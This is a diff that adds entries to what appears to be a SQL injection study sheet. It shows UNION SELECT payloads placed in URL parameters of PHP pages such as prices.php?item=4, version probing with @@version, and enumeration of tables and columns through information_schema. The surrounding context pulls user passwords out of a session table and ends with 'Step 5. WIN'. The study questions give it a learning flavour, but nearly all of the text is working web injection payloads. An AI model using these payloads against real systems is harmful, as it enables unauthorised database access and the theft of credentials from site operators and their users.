@@ -291,3 +291,41 @@ Selct id, name and pass from user table in session db
 Selection=3 UNION SELECT id,pass,name FROM session.user
 
 Step 5. WIN
+
+# WHERE
+
+Nesting Statements
+
+php?key=<value>UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+# Abuse The Client (GET METHOD)
+Passing injection through the URL:
+
+After the .PHP?ITEM=4 pass your UNION statement
+
+
+
+prices.php?item=4 UNION SELECT 1,2
+
+
+
+prices.php?item=4 UNION SELECT 1,2,@@version
+
+
+
+What is @@VERSION?
+
+# Abuse The Client (Enum)
+Identifying the schema leads to detailed queries to enumerate the DB
+
+
+
+Research Database Schemas and what information they provide
+
+
+
+php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+
+
+What are INFORMATION_SCHEMA and DATABASE()?
+
